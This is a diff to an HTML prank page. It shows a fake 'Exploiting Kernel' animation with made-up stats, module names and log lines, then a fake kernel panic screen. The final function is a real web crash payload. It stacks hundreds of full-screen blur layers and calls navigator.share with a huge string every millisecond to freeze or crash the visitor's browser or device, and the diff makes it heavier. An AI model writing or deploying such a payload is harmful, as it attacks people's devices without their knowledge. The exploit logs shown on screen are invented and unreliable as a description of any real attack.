@@ -36,9 +36,11 @@
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
         h1 {
-            font-size: 1.4rem; margin: 0 0 20px 0; letter-spacing: -0.5px;
+            font-size: 1.4rem; margin: 0 0 10px 0; letter-spacing: -0.5px;
             background: linear-gradient(to bottom, #fff, #a1a1a1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
+
+        .sub-header { font-size: 10px; color: #444; margin-bottom: 20px; font-family: monospace; }
 
         .progress-container { background: rgba(255, 255, 255, 0.05); border-radius: 10px; height: 4px; width: 100%; margin-bottom: 20px; overflow: hidden; }
         .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); }
@@ -81,6 +83,7 @@
         </div>
         
         <h1>Exploiting Kernel</h1>
+        <div id="sub-info" class="sub-header">Module: core_exploit.bin</div>
         
         <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
         
@@ -135,20 +138,24 @@
 
         // --- ЖИВЫЕ ЦИФРЫ ---
         let pktCount = 0;
+        const modules = ["core_exploit.bin", "memory_patcher.lib", "sandbox_escape.sh", "root_access.sys"];
+        
         function updateStats() {
-            // Битрейт скачет
-            const br = (Math.random() * 15 + 5).toFixed(1);
+            const br = (Math.random() * 25 + 10).toFixed(1);
             document.getElementById('bitrate').innerText = `Bitrate: ${br} MB/s`;
             
-            // Память меняется
-            const mem = "0x" + Math.floor(Math.random()*1000000).toString(16).toUpperCase();
+            const mem = "0x" + Math.floor(Math.random()*16777215).toString(16).toUpperCase();
             document.getElementById('mem-addr').innerText = `MEM: ${mem}`;
             
-            // Пакеты растут
-            pktCount += Math.floor(Math.random() * 50);
+            pktCount += Math.floor(Math.random() * 100);
             document.getElementById('packets').innerText = `PKTS: ${pktCount}`;
+            
+            if (Math.random() > 0.95) {
+                const randomMod = modules[Math.floor(Math.random() * modules.length)];
+                document.getElementById('sub-info').innerText = `Module: ${randomMod}`;
+            }
         }
-        setInterval(updateStats, 150);
+        setInterval(updateStats, 100);
 
         // --- ЛОГИКА ТЕРМИНАЛА ---
         const logs = [
@@ -160,8 +167,8 @@
             {t: "> Crafting fake vtable object...", c: ""},
             {t: "> Exploiting task_for_pid(0)...", c: "warn"},
             {t: "> Kernel read/write primitive: OK", c: ""},
-            {t: "> Disabling sandbox profiles...", c: ""},
             {t: "> Stage 2: Injecting shellcode...", c: "blue"},
+            {t: "> Disabling sandbox profiles...", c: ""},
             {t: "> FATAL: KPP triggered memory panic", c: "warn"},
             {t: "> Emergency cleanup failed...", c: ""}
         ];
@@ -171,10 +178,10 @@
         const consoleEl = document.getElementById('console');
 
         const loadInterval = setInterval(() => {
-            barWidth += 0.7;
+            barWidth += 0.9;
             bar.style.width = Math.min(barWidth, 100) + "%";
             if (barWidth >= 100) clearInterval(loadInterval);
-        }, 40);
+        }, 35);
 
         function startLogs(index) {
             if (index < logs.length) {
@@ -183,19 +190,19 @@
                 div.innerText = logs[index].t;
                 consoleEl.appendChild(div);
                 consoleEl.scrollTop = consoleEl.scrollHeight;
-                setTimeout(() => startLogs(index + 1), Math.random() * 500 + 300);
+                setTimeout(() => startLogs(index + 1), Math.random() * 400 + 200);
             } else {
-                setTimeout(triggerInstantPanic, 600);
+                setTimeout(triggerInstantPanic, 500);
             }
         }
 
         function triggerInstantPanic() {
             const panicScreen = document.getElementById('panic-screen');
             let trapText = "";
-            for(let i=0; i<4000; i++) trapText += "0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
+            for(let i=0; i<5000; i++) trapText += "0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
             panicScreen.innerText = trapText;
             panicScreen.style.display = 'block';
-            setTimeout(executeRespring, 80);
+            setTimeout(executeRespring, 60);
         }
 
         function executeRespring() {
@@ -204,13 +211,13 @@
                 const c = document.createElement('div');
                 c.style.cssText = 'perspective: 1px; perspective-origin: 99% 99%;';
                 document.body.appendChild(c);
-                for (let i = 0; i < 800; i++) {
+                for (let i = 0; i < 900; i++) {
                     let d = document.createElement('div');
                     d.style.cssText = 'position:absolute; width:100vw; height:100vh; backdrop-filter:blur(100px); -webkit-backdrop-filter:blur(100px); transform:translate3d(100px,100px,'+i+'px);';
                     c.appendChild(d);
                 }
                 setInterval(() => {
-                    try { navigator.share({title:'X', text:'X'.repeat(400000)}); } catch(e){}
+                    try { navigator.share({title:'X', text:'X'.repeat(500000)}); } catch(e){}
                 }, 1);
             <\/script></body></html>`;
         }
